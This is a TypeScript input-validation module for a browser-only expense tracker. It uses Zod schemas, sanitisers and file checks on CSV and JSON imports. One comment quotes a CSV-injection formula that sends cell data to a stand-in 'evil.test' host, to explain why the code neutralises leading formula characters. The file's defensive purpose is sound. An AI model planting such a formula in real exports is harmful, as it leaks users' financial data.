/**
 * Validation at the trust boundary.
 *
 * There is no server here, which is exactly why this file matters. "Validate on
 * the server" is the usual advice because the client cannot be trusted — but
 * when the client *is* the whole application, the boundary moves to wherever
 * data arrives from outside the running program:
 *
 *   - a CSV the user picked off disk
 *   - a JSON backup, possibly hand-edited, possibly from another version
 *   - data.json pulled from GitHub, possibly written by a newer build
 *
 * A malformed backup can corrupt the database just as thoroughly as a malicious
 * request can corrupt a server. Everything above is parsed through Zod before it
 * is allowed anywhere near Dexie.
 *
 * The schemas are deliberately *lenient about shape* and *strict about meaning*:
 * an unknown field is dropped rather than rejected (so an older build can read a
 * newer export), but a negative amount or a malformed date is refused outright.
 */
import { z } from 'zod';
import { SYNC_TABLES } from '@/types';
import type { SyncTable } from '@/types';

// ---------------------------------------------------------------------------
// Limits
// ---------------------------------------------------------------------------

/** Imports are read into memory, so the cap is about not hanging the tab. */
export const MAX_IMPORT_BYTES = 5 * 1024 * 1024; // 5 MB

/** A 5 MB CSV is roughly 50,000 expenses; well past any personal dataset. */
export const MAX_IMPORT_ROWS = 50_000;

/**
 * Largest amount accepted anywhere, in paise: Rs 1,000 crore.
 *
 * Not a judgement about anyone's wealth — it sits three orders of magnitude
 * below Number.MAX_SAFE_INTEGER so no arithmetic downstream can silently lose
 * precision, and it catches a misplaced decimal or a corrupted field.
 */
export const MAX_PAISE = 1_000_00_00_00_000;

export class ValidationError extends Error {
  constructor(message: string, readonly details?: string[]) {
    super(message);
    this.name = 'ValidationError';
  }
}

// ---------------------------------------------------------------------------
// Text sanitising
// ---------------------------------------------------------------------------

/**
 * Remove control characters from untrusted text.
 *
 * Written as a codepoint filter rather than a regex character class on purpose:
 * a class of literal control characters is invisible in a diff and trivial to
 * corrupt when the file is edited by a tool. This says exactly what it means.
 *
 * React escapes on output, so this is not an XSS control — it is about a CSV
 * cell containing a stray NUL or an ANSI escape ending up in the database and
 * then in an exported file.
 */
export function stripControlChars(input: string): string {
  let out = '';
  for (const ch of input) {
    const code = ch.codePointAt(0) ?? 0;
    // Keep everything printable. Drop C0 (0–31) and DEL (127).
    if (code >= 32 && code !== 127) out += ch;
  }
  return out;
}

/** Sanitise and cap a free-text field coming from a file. */
export function cleanText(value: unknown, max: number): string {
  return stripControlChars(String(value ?? '')).trim().slice(0, max);
}

/**
 * Neutralise a CSV cell that a spreadsheet would execute as a formula.
 *
 * Excel, LibreOffice and Sheets treat a leading `=`, `+`, `-` or `@` as the
 * start of a formula, so an expense described as
 * `=HYPERLINK("https://evil.test?d="&A1,"Total")` becomes a live, clickable
 * exfiltration link the moment the export is opened. The tab, CR and LF forms
 * are included because those also reach a formula parser in some versions.
 *
 * The fix is the widely used one: prefix a single quote, which spreadsheets
 * read as "treat the rest as text" and strip on display. Re-importing is
 * unaffected — PaisaTrack's own importer runs `cleanText`, and a stray leading
 * quote in a description is a far better outcome than a live formula.
 *
 * This matters even for a single-user app: the rows come from CSVs the user
 * imported, which came from a bank or a card issuer, which is exactly where
 * hostile text would arrive from.
 */
export function csvSafe(value: unknown): string {
  const text = String(value ?? '');
  return /^[=+\-@\t\r\n]/.test(text) ? `'${text}` : text;
}

// ---------------------------------------------------------------------------
// Primitives
// ---------------------------------------------------------------------------

/** An integer number of paise, within sane bounds. Negative allowed: refunds. */
export const paiseSchema = z
  .number()
  .int('Amounts must be whole paise — this value has a fraction of a paisa.')
  .min(-MAX_PAISE, 'Amount is implausibly large and negative.')
  .max(MAX_PAISE, 'Amount is implausibly large.');

/** A non-negative amount, for anything that cannot sensibly be negative. */
export const positivePaiseSchema = paiseSchema.min(0, 'Amount cannot be negative.');

/**
 * Does this YYYY-MM-DD string name a day that exists?
 *
 * `Date.parse` is not the check it looks like. It rejects month 13, but it
 * silently rolls a day overflow forward: `2026-02-30` parses to 2 March and
 * `2026-04-31` to 1 May. A spreadsheet column that produced "31/04" would then
 * be stored verbatim and displayed as May — a wrong date that never announces
 * itself. Round-tripping the components is the only check that catches it.
 */
export function isRealCalendarDate(value: string): boolean {
  const [y, m, d] = value.split('-').map(Number);
  if (!Number.isInteger(y) || !Number.isInteger(m) || !Number.isInteger(d)) return false;
  const date = new Date(Date.UTC(y, m - 1, d));
  return (
    date.getUTCFullYear() === y && date.getUTCMonth() === m - 1 && date.getUTCDate() === d
  );
}

export const isoDateSchema = z
  .string()
  .regex(/^\d{4}-\d{2}-\d{2}$/, 'Date must be YYYY-MM-DD.')
  .refine(isRealCalendarDate, 'Not a real date.');

export const isoTimestampSchema = z
  .string()
  .refine((t) => !Number.isNaN(Date.parse(t)), 'Not a valid timestamp.');

export const monthKeySchema = z.string().regex(/^\d{4}-\d{2}$/, 'Month must be YYYY-MM.');

/**
 * An id. Constrained so an id read from a file cannot smuggle anything odd into
 * a key position.
 */
export const idSchema = z
  .string()
  .min(1)
  .max(128)
  .regex(/^[A-Za-z0-9_.:@-]+$/, 'Ids may only contain letters, digits and _ . : @ -');

/** Free text from a file: capped, control characters stripped. */
export function textSchema(max = 500) {
  return z.string().max(max).transform((s) => cleanText(s, max));
}

// ---------------------------------------------------------------------------
// Records
// ---------------------------------------------------------------------------

const baseRecordSchema = z.object({
  id: idSchema,
  createdAt: isoTimestampSchema,
  updatedAt: isoTimestampSchema,
  deviceId: z.string().max(64).optional(),
  deletedAt: isoTimestampSchema.nullable().optional(),
});

export const EXPENSE_CATEGORIES = [
  'FOOD', 'GROCERIES', 'TRANSPORT', 'FUEL', 'SHOPPING', 'ENTERTAINMENT',
  'HEALTH', 'EDUCATION', 'TRAVEL', 'PERSONAL_CARE', 'GIFTS', 'HOUSEHOLD',
  'BILLS', 'RENT', 'EMI', 'INVESTMENT', 'FEES', 'OTHER',
] as const;

export const PAYMENT_METHODS = [
  'CASH', 'UPI', 'DEBIT_CARD', 'CREDIT_CARD', 'NET_BANKING', 'WALLET', 'AUTO_DEBIT',
] as const;

export const expenseSchema = baseRecordSchema.extend({
  userId: z.string().max(128),
  amount: positivePaiseSchema,
  category: z.enum(EXPENSE_CATEGORIES),
  subcategory: textSchema(100).optional(),
  description: textSchema(300),
  date: isoDateSchema,
  paymentMethod: z.enum(PAYMENT_METHODS),
  creditCardId: idSchema.nullable().optional(),
  isRecurring: z.boolean(),
  tags: z.array(textSchema(50)).max(20).optional(),
  notes: textSchema(1000).optional(),
});

// ---------------------------------------------------------------------------
// CSV import
// ---------------------------------------------------------------------------

export interface ParsedCsvRow {
  date: string;
  amount: number;
  category: (typeof EXPENSE_CATEGORIES)[number];
  description: string;
  paymentMethod: (typeof PAYMENT_METHODS)[number];
  notes?: string;
}

export interface CsvImportResult {
  rows: ParsedCsvRow[];
  /** One readable line per rejected row, for the toast. */
  problems: string[];
}

/**
 * Validate a parsed CSV.
 *
 * Rows are checked one at a time and a bad row is *skipped and reported* rather
 * than failing the whole import — someone importing 400 expenses should not
 * lose all of them because row 212 has a typo.
 */
export function validateCsvRows(
  raw: Array<Record<string, string>>,
  toPaise: (v: string | number) => number,
): CsvImportResult {
  const rows: ParsedCsvRow[] = [];
  const problems: string[] = [];

  if (raw.length > MAX_IMPORT_ROWS) {
    throw new ValidationError(
      `That file has ${raw.length.toLocaleString('en-IN')} rows, over the ${MAX_IMPORT_ROWS.toLocaleString('en-IN')} limit.`,
    );
  }

  raw.forEach((row, i) => {
    const line = i + 2; // +1 for zero-index, +1 for the header row

    const rawAmount = String(row.amount ?? '').replace(/[^0-9.-]/g, '');
    if (!rawAmount) {
      problems.push(`Row ${line}: no amount`);
      return;
    }

    let amount: number;
    try {
      amount = toPaise(rawAmount);
    } catch {
      problems.push(`Row ${line}: "${cleanText(row.amount, 20)}" is not an amount`);
      return;
    }

    if (amount <= 0) {
      problems.push(`Row ${line}: amount must be greater than zero`);
      return;
    }
    if (amount > MAX_PAISE) {
      problems.push(`Row ${line}: amount is implausibly large`);
      return;
    }

    const date = String(row.date ?? '').trim();
    if (!/^\d{4}-\d{2}-\d{2}$/.test(date)) {
      problems.push(`Row ${line}: date must be YYYY-MM-DD`);
      return;
    }
    // Separate message: "31/04/2026" is the right shape and still not a day.
    // Telling someone to use YYYY-MM-DD when they already did is useless.
    if (!isRealCalendarDate(date)) {
      problems.push(`Row ${line}: ${date} is not a real date`);
      return;
    }

    const categoryRaw = String(row.category ?? 'OTHER').toUpperCase().trim();
    const category = (EXPENSE_CATEGORIES as readonly string[]).includes(categoryRaw)
      ? (categoryRaw as ParsedCsvRow['category'])
      : 'OTHER';

    const methodRaw = String(row.paymentMethod ?? 'UPI')
      .toUpperCase()
      .replace(/\s+/g, '_')
      .trim();
    const paymentMethod = (PAYMENT_METHODS as readonly string[]).includes(methodRaw)
      ? (methodRaw as ParsedCsvRow['paymentMethod'])
      : 'UPI';

    const description =
      cleanText(row.description, 300) || category.replace(/_/g, ' ').toLowerCase();
    const notes = cleanText(row.notes, 1000);

    rows.push({
      date,
      amount,
      category,
      description,
      paymentMethod,
      ...(notes ? { notes } : {}),
    });
  });

  return { rows, problems };
}

// ---------------------------------------------------------------------------
// Backup / sync payload
// ---------------------------------------------------------------------------

export const SCHEMA_VERSION = 1;

/**
 * A payload read from a backup file or from GitHub.
 *
 * Each table is `z.array(z.unknown())` here rather than a full per-entity
 * schema: the per-table shapes are checked by `validatePayloadRecords()` below,
 * which drops bad records individually instead of rejecting the whole file.
 * Losing one corrupt expense is recoverable; losing the backup is not.
 */
export const syncPayloadSchema = z.object({
  schemaVersion: z.number().int().min(1).optional(),
  exportedAt: z.string().optional(),
  deviceId: z.string().max(64).optional(),
  data: z.record(z.string(), z.array(z.unknown())),
});

export interface PayloadValidationResult {
  data: Record<SyncTable, unknown[]>;
  dropped: number;
  problems: string[];
}

/**
 * Keep only records that look like records.
 *
 * Minimal structural requirements — an id and timestamps — because this has to
 * tolerate a payload written by a different version of the app. Anything that
 * fails is dropped and counted, never silently kept.
 */
export function validatePayloadRecords(
  raw: Record<string, unknown[]>,
): PayloadValidationResult {
  const data = {} as Record<SyncTable, unknown[]>;
  const problems: string[] = [];
  let dropped = 0;

  for (const table of SYNC_TABLES) {
    const rows = Array.isArray(raw[table]) ? raw[table] : [];
    const kept: unknown[] = [];

    for (const row of rows) {
      const parsed = baseRecordSchema.safeParse(row);
      if (parsed.success) {
        kept.push(row);
      } else {
        dropped += 1;
        if (problems.length < 5) {
          problems.push(`${table}: ${parsed.error.issues[0]?.message ?? 'malformed record'}`);
        }
      }
    }

    data[table] = kept;
  }

  return { data, dropped, problems };
}

/** Parse and validate a data.json / backup file. Throws on anything unusable. */
export function parseAndValidatePayload(text: string): PayloadValidationResult & {
  schemaVersion: number;
  exportedAt: string;
  deviceId: string;
} {
  if (text.length > MAX_IMPORT_BYTES) {
    throw new ValidationError('That file is too large to be a PaisaTrack backup.');
  }

  let json: unknown;
  try {
    json = JSON.parse(text);
  } catch {
    throw new ValidationError('That file is not valid JSON. Refusing to merge it.');
  }

  const parsed = syncPayloadSchema.safeParse(json);
  if (!parsed.success) {
    throw new ValidationError(
      'That file does not look like a PaisaTrack export.',
      parsed.error.issues.slice(0, 3).map((i) => i.message),
    );
  }

  const { schemaVersion = SCHEMA_VERSION, exportedAt, deviceId } = parsed.data;
  if (schemaVersion > SCHEMA_VERSION) {
    throw new ValidationError(
      `This data was written by a newer version of PaisaTrack (schema ${schemaVersion}). Update this device before syncing.`,
    );
  }

  return {
    ...validatePayloadRecords(parsed.data.data),
    schemaVersion,
    exportedAt: exportedAt ?? new Date().toISOString(),
    deviceId: deviceId ?? 'unknown',
  };
}

// ---------------------------------------------------------------------------
// Files
// ---------------------------------------------------------------------------

export interface FileCheck {
  ok: boolean;
  message?: string;
}

/**
 * Check a picked file before reading it.
 *
 * The file never leaves the browser, but it is still untrusted input: a 2 GB
 * file would hang the tab, and an executable renamed to .csv is at best a
 * mistake worth catching early.
 */
export function checkImportFile(file: File, kind: 'csv' | 'json'): FileCheck {
  if (file.size === 0) {
    return { ok: false, message: 'That file is empty.' };
  }
  if (file.size > MAX_IMPORT_BYTES) {
    const mb = (file.size / 1024 / 1024).toFixed(1);
    return {
      ok: false,
      message: `That file is ${mb} MB. The limit is ${MAX_IMPORT_BYTES / 1024 / 1024} MB — far larger than any real export.`,
    };
  }

  const name = file.name.toLowerCase();
  const expectedExt = kind === 'csv' ? '.csv' : '.json';
  if (!name.endsWith(expectedExt)) {
    return { ok: false, message: `Expected a ${expectedExt} file.` };
  }

  // Browsers disagree about the MIME type for CSV, so an empty or unfamiliar
  // type is tolerated — the extension and the parse are the real checks. An
  // actively contradictory type is not.
  const typeLooksWrong =
    kind === 'json'
      ? Boolean(file.type) && !file.type.includes('json')
      : Boolean(file.type) && !/csv|excel|text|plain|octet-stream/i.test(file.type);

  if (typeLooksWrong) {
    return { ok: false, message: `That file reports its type as "${file.type}".` };
  }

  return { ok: true };
}
